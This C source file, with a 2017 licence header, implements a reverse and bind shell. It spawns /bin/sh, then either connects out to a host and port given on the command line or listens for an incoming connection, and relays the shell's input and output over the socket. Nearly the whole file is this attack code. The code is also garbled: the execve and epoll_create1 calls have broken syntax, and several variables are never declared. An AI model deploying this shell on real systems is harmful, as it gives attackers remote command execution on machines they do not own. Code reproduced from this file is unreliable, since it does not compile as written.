/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/epoll.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include "sph"

#define HTONS(x) ((((uint16_t)(x) & 0xff00) >> 8) | (((uint16_t)(x) & 0x00ff) << 8))

void main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int                i, r, evt, pid, fd, h[2];
    char               buf[BUFSIZ];
    struct epoll_event evts[1];

    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
    pipe(out);

    // execute /bin/sh as child process
    pid = fork();
    
    if (pid==0) 
    {
      // assign read end to stdin
      dup2(in[0], STDIN_FILENO);
      // assign write end to stdout   
      dup2(out[1], STDOUT_FILENO);
      // assign write end to stderr  
      dup2(out[1], STDERR_FILENO);  
      
      close(in[0]);
      close(in[1]);
      
      close(out[0]);
      close(out[1]);
      
      execve, "/bin/sh", NULL, NULL);
    } else {      
      close(in[0]); // close read end
      close(out[1]); // close write end
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family      = AF_INET;
      sa.sin_port        = HTONS(atoi(argv[2]));
      sa.sin_addr.s_addr = inet_addr(argv[1]);

      #ifdef CONNECT
        // attempt connection to remote host
        connect(s, (struct sockaddr*)&sa, sizeof(sa));
      #else
        bind(s, (struct sockaddr*)&sa, sizeof(sa));
        listen(s, 0);
        r = accept(s, 0, 0);
      #endif
      
      if ((efd = epoll_create1, 0)) > 0)
      {
        h[0] = s;    // assign socket to peer
        h[1] = out[0]; // assign read end for stdout/stderr
        
        // add 2 descriptors to monitor
        // level triggered
        for (i=0; i<2; i++) {
          evts[0].data.fd = h[i];
          evts[0].events  = EPOLLIN;
          
          epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evts[0]);
        }
          
        // now loop until user exits or some other error
        for (;;)
        {
          r = epoll_wait(efd, evts, 1, -1);
                    
          if (r <= 0) {
            break;
          }
           
          evt = evts[0].events;
          fd  = evts[0].data.fd;
          
          if (!(evt & EPOLLIN)) break;

          if (fd == s) {
            // receive incoming data
            len=read(s, buf, BUFSIZ);                          
            // write to stdin of child process
            write(in[1], buf, len);
          } else {
            // read from stdout/stderr
            len = read(out[0], buf, BUFSIZ);
            // send to remote peer
            write(s, buf, len);
          }         
        }
        // remove 2 descriptors 
        for (i=0; i<2; i++) {
          epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);
        }            
        close(efd);
      }
      kill(pid, SIGCHLD);
      shutdown(s, SHUT_RDWR);      
      close(s);
    }
    close(in[1]);
    close(out[0]);
    exit(0);    
}
    
